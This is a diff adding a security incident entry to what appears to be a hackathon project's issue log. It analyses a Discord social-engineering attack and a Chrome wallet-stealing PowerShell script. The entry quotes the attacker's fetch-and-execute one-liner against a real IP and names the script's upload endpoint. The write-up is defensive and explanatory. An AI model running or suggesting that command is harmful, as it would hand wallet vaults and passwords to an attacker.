@@ -217,3 +217,57 @@ not keep, and `track3-certwatch/src/server.ts` disables the background sweep loo
 instance never fires an interval. So CertWatch currently has no durable history and no scheduler.
 **Fix:** move state to a real store and drive sweeps from a scheduled GitHub Action hitting the
 authenticated endpoint, rather than an in-process timer.
+
+---
+
+## Security
+
+### G19 · The miner wallet's seed phrase is compromised — `OPEN, accepted risk`
+2026-08-28. The operator was social-engineered in a hackathon Discord DM by an account named
+`ADMINS {NEVER DM FIRST}` — the name copies the label real servers use to warn that admins never
+DM first — and ran:
+
+```
+iwr -useb http://170.205.30.207/usertroubleshoot.ps1 | iex
+```
+
+The script was retrieved as text and analysed (never re-executed). It is a narrow wallet stealer:
+it walks every Chrome profile, copies the `Local Extension Settings` vault for MetaMask, Phantom
+and Rabby, prompts for the wallet password and writes it in plaintext, zips both, POSTs to
+`http://170.205.30.207:3000/upload`, then deletes the staging folder. The staging folder was
+already gone when checked, so the upload path completed.
+
+**Scope, verified on the machine:**
+- **Five Chrome profiles** hold MetaMask vaults (`Default`, `Profile 1`, `Profile 9`, `Profile 10`,
+  `Profile 12`). Vault + password = seed phrase. Treat every seed in those profiles as lost, and
+  the encrypted vaults as brute-forceable even where no password was typed.
+- **No persistence.** No scheduled task, Run key or startup entry was created; all present entries
+  are legitimate. It runs once and exits.
+- **It does not read** the GitHub token, Vercel token, SSH keys, `.env` files, saved browser
+  passwords or cookies. Those were **not** rotated, deliberately — rotating them would have been
+  an hour of work against a threat that does not exist here.
+- Chrome only. Edge, Brave and Firefox were untouched.
+
+**Caveat:** `iex` executed whatever that host served at that moment; the analysis is of what it
+served afterwards. Observed behaviour matched (password prompts, folder created then removed) and
+the absence of persistence corroborates it, but this is not a byte-identical guarantee.
+
+**Why this is a project risk, not just a wallet risk.** `0xdAd2…A39E` owns registration **260**.
+Whoever holds that seed can call `deregisterMiner(260)` for the price of gas and delete the Track 1
+entry — four rank-1 positions and six intents. On-chain state checked the same day: nonce 3, which
+matches only our own registrations, and 0.0 native balance on Ethereum, Base and Arbitrum mainnet.
+**Nothing has been touched.**
+
+**Accepted rather than mitigated, deliberately.** Re-registering from a clean wallet three days
+before the close would mean a new registration id, a fresh rejection risk, and losing the running
+score history — for protection against an attacker who gains nothing by acting. Drainers are
+automated and profit-motivated; deleting a testnet miner earns them nothing.
+
+**What a fresh session should know:**
+- `.github/workflows/uptime.yml` polls registration 260 every 15 minutes and opens an issue if
+  `activation_status` changes. That alerting is now load-bearing. **If the miner is ever found
+  deregistered, this is the likely cause — re-register from a clean wallet, do not assume a
+  protocol fault.**
+- Do not use those seeds for anything after the hackathon.
+- The same Discord contact also pushed a fake "Vercel dapps mainnet wallet validation" flow. There
+  is no such thing. No legitimate Telegraph step needs a PowerShell script or a seed phrase.
